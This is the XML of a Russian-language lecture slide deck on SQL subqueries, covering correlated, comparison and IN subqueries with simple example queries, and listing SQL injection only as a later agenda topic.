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7"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="381" r:id="rId2"/>
    <p:sldId id="387" r:id="rId3"/>
    <p:sldId id="468" r:id="rId4"/>
    <p:sldId id="469" r:id="rId5"/>
    <p:sldId id="470" r:id="rId6"/>
    <p:sldId id="471" r:id="rId7"/>
    <p:sldId id="472" r:id="rId8"/>
    <p:sldId id="473" r:id="rId9"/>
    <p:sldId id="474" r:id="rId10"/>
    <p:sldId id="475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85" r:id="rId21"/>
    <p:sldId id="486" r:id="rId22"/>
    <p:sldId id="487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95" r:id="rId31"/>
    <p:sldId id="496" r:id="rId32"/>
    <p:sldId id="497" r:id="rId33"/>
    <p:sldId id="498" r:id="rId34"/>
    <p:sldId id="499" r:id="rId35"/>
    <p:sldId id="500" r:id="rId36"/>
    <p:sldId id="501" r:id="rId37"/>
    <p:sldId id="502" r:id="rId38"/>
    <p:sldId id="503" r:id="rId39"/>
    <p:sldId id="504" r:id="rId40"/>
    <p:sldId id="505" r:id="rId41"/>
    <p:sldId id="506" r:id="rId42"/>
    <p:sldId id="507" r:id="rId43"/>
    <p:sldId id="508" r:id="rId44"/>
    <p:sldId id="509" r:id="rId45"/>
    <p:sldId id="510" r:id="rId46"/>
    <p:sldId id="511" r:id="rId47"/>
    <p:sldId id="512" r:id="rId48"/>
    <p:sldId id="513" r:id="rId49"/>
    <p:sldId id="514" r:id="rId50"/>
    <p:sldId id="515" r:id="rId51"/>
    <p:sldId id="516" r:id="rId52"/>
    <p:sldId id="517" r:id="rId53"/>
    <p:sldId id="518" r:id="rId54"/>
    <p:sldId id="519" r:id="rId55"/>
    <p:sldId id="520" r:id="rId56"/>
    <p:sldId id="521" r:id="rId57"/>
    <p:sldId id="522" r:id="rId58"/>
    <p:sldId id="523" r:id="rId59"/>
    <p:sldId id="524" r:id="rId60"/>
    <p:sldId id="525" r:id="rId61"/>
    <p:sldId id="526" r:id="rId62"/>
    <p:sldId id="527" r:id="rId63"/>
    <p:sldId id="528" r:id="rId64"/>
    <p:sldId id="529" r:id="rId65"/>
    <p:sldId id="530" r:id="rId6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1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89692" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="93" d="100"/>
          <a:sy n="93" d="100"/>
        </p:scale>
        <p:origin x="5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29.02.2024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21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123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263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643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33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06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938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886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846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001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418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Вложенные запросы</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" smtClean="0"/>
              <a:t>Коррелированные запросы</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" smtClean="0"/>
              <a:t>Монотонные запросы</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" smtClean="0"/>
              <a:t>Не монотонные запросы и операция деления</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" smtClean="0"/>
              <a:t>Примеры сложных запросов на </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>SQL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Выполнение </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>запросов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Статический и динамический </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Подстановка данных в запрос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Инъекции в языки запросов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Понятие инъекции в языки запросов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Классификация </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> – инъекций (и примеры)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/>
            <a:endParaRPr lang="ru-RU" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="857250" lvl="1" indent="-457200"/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Построение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вложенных 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4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60CD8-FE33-E0AA-E66C-C1FDB9D0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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0" err="1" smtClean="0"/>
              <a:t>поздзапросов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DA2B2-4849-0C5D-7C28-8F0E548A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1340768"/>
            <a:ext cx="8723239" cy="3888432"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Типы подзапросов</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Табличный подзапрос;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Подзапрос строки;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Скалярный подзапрос.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Задачи подзапросов</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Определять набор строк:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>В  INSERT ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>В представление (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VIEW</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>В UPDATE ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Указывать одно или несколько значений в WHERE и HAVING оператора SELECT ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Определять во FROM таблицу как результат выполнения подзапроса ;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Реализовывать сложные условия и операцию деления через </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>коррелированные подзапросы</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>. 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DF873-EF1D-6A5D-B244-E0C0680D9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6066B0-D7CD-DF89-6AC2-50849C4F226E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3778802" y="1475305"/>
            <a:ext cx="5113679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EDescription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TEvent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EventID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endParaRPr lang="ru-RU" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1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795" indent="448945" algn="just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EventID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tx1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795" indent="448945" algn="just"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EventStruct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ELevel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3355AB-E9C9-22E1-5D61-64F0774F5288}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="354902" y="5238639"/>
            <a:ext cx="8537579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ru-RU" sz="1600" dirty="0"/>
              <a:t>Подзапрос называется </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>коррелированным</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>, если запрос, содержащийся в предикате:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>имеет ссылку на значение из таблицы (внешней к данному запросу), </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFontTx/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>которая проверяется посредством данного предиката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6484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EE03B-3441-57F1-2A3C-89FD4DF1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Подзапрос на равенство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B4E7AA-4509-C707-9BCE-473D1195E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7" name="Объект 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35DFA2CE-00EC-78DB-270F-7EF9777213B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7544" y="2517083"/>
          <a:ext cx="7980000" cy="246888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745414">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3763191812"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4234586">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="248457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Варианты действия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СУБД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5490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Одна строка</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr indent="0" algn="just"/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69300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Набор (несколько) строк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64353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Пустое множество строк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731995666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073A12-30C4-4AC1-7DB3-3CB59CA8B878}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1486728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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>         WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2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ru-RU" dirty="0"/>
              <a:t>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82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EE03B-3441-57F1-2A3C-89FD4DF1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Подзапрос на равенство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B4E7AA-4509-C707-9BCE-473D1195E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7" name="Объект 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35DFA2CE-00EC-78DB-270F-7EF9777213B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="467544" y="2517083"/>
          <a:ext cx="7980000" cy="246888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745414">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3763191812"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4234586">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="248457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Варианты действия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СУБД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5490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Одна строка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Ошибка или корректное сравнение в зависимости от СУБД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69300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Набор (несколько) строк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Ошибка синтаксиса или выполнения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64353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Пустое множество строк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UNKNOWN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731995666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073A12-30C4-4AC1-7DB3-3CB59CA8B878}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1486728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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>         WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2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ru-RU" dirty="0"/>
              <a:t>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32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3F1E6-5D9B-8B63-F829-677B5645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Подзапрос на сравнение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C2B94C-C148-8436-9B13-8478C9734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46A0D4-9891-DE48-955C-40F92A8A3B78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038754" y="1340768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f1,f2,f3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 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indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2 &gt;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96F0419-57C2-8CCC-F6DE-57C03FC9ABC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9159" y="2176370"/>
          <a:ext cx="6845681" cy="164592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213021">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4265877521"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3632660">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3794752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>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Варианты действия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5930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Одна строка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663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Набор (несколько)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8844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Пустое множество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97184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07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3F1E6-5D9B-8B63-F829-677B5645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Подзапрос на сравнение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C2B94C-C148-8436-9B13-8478C9734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46A0D4-9891-DE48-955C-40F92A8A3B78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038754" y="1340768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f1,f2,f3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 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indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2 &gt;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96F0419-57C2-8CCC-F6DE-57C03FC9ABC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9159" y="2176370"/>
          <a:ext cx="6845681" cy="164592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213021">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4265877521"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3632660">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3794752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>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Варианты действия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5930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Одна строка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663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Набор (несколько)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8844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Пустое множество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97184514"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Крест 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7D0DB3F-3126-7764-3A8A-898449E0E6E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2480998">
            <a:off x="4815685" y="2676601"/>
            <a:ext cx="1227282" cy="1200847"/>
          </a:xfrm>
          <a:prstGeom prst="plus">
            <a:avLst>
              <a:gd name="adj" fmla="val 4530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6BBFA9-A7F3-B74D-D94E-EDC73ADA01A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1054175" y="4066807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f1,f2,f3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 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indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2 IN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12E25CC-F157-9665-31DA-606D94942E9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24111" y="4893378"/>
          <a:ext cx="6845681" cy="164592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213021">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4265877521"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3632660">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3794752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>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Варианты действия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5930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Одна строка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663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Набор (несколько)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8844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Пустое множество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97184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7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3F1E6-5D9B-8B63-F829-677B5645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Подзапрос на сравнение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C2B94C-C148-8436-9B13-8478C9734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46A0D4-9891-DE48-955C-40F92A8A3B78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038754" y="1340768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f1,f2,f3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 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indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2 &gt;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96F0419-57C2-8CCC-F6DE-57C03FC9ABC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1149159" y="2176370"/>
          <a:ext cx="6845681" cy="164592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213021">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4265877521"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3632660">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3794752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>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Варианты действия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5930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Одна строка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663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Набор (несколько)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8844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Пустое множество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97184514"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Крест 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7D0DB3F-3126-7764-3A8A-898449E0E6E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2480998">
            <a:off x="4815685" y="2676601"/>
            <a:ext cx="1227282" cy="1200847"/>
          </a:xfrm>
          <a:prstGeom prst="plus">
            <a:avLst>
              <a:gd name="adj" fmla="val 4530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6BBFA9-A7F3-B74D-D94E-EDC73ADA01A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1054175" y="4066807"/>
            <a:ext cx="68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dirty="0"/>
              <a:t>SELECT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f1,f2,f3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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tbl1 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indent="0" algn="just">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f2 IN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(SELECT f2 FROM tbl2 WHERE f1=1);</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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12E25CC-F157-9665-31DA-606D94942E9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24111" y="4893378"/>
          <a:ext cx="6845681" cy="173736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213021">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4265877521"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3632660">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3794752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>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Варианты действия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5930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Одна строка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 rowSpan="3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accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>TRUE, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>если </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>хотя бы одно из значений</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, возвращаемых подзапросом, удовлетворяет условию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663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Набор (несколько)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8844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/>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1800" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Пустое множество строк</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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accent5"/>
                        </a:solidFill>
                        <a:effectLst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97184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24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75B0F-ED19-1E0B-1F9A-C967DE67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Коррелированные подзапросы: пример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00E83A-BB03-4589-6129-D8FC4280B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0B630-5840-B3DF-88EA-4B4108472C98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2699792" y="213285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SELECT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*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> from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tbl1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>t1</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/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    WHERE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f2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> IN </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0"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ru-RU" dirty="0"/>
              <a:t>              </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst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f2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0"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ru-RU" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst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tbl2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>t2</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/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solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>                 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
